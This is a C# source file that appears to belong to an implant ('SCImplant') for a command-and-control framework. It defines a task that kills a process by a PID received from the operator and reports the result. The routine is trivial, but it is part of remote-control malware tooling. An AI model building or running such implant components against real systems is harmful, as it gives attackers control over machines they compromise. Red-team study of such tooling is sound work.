using System;
using System.Diagnostics;
using SaltedCaramel.Jobs;


namespace SaltedCaramel.Tasks
{
    public class Kill
    {
        /// <summary>
        /// Kill a process based on the PID given by
        /// job.Task.@params
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="agent">Agent to run this command on.</param>
        public static void Execute(Job job, SCImplant agent)
        {
            SCTask task = job.Task;
            int pid = Convert.ToInt32(task.@params);
            try
            {
                Debug.WriteLine("[-] Kill - Killing process with PID " + pid);
                Process target = Process.GetProcessById(pid);
                target.Kill();
                task.status = "complete";
                task.message = $"Killed process with PID {pid}";
            }
            catch (Exception e)
            {
                Debug.WriteLine("[-] Kill - ERROR killing process " + pid + ": " + e.Message);
                task.status = "error";
                task.message = e.Message;
            }
        }
    }
}
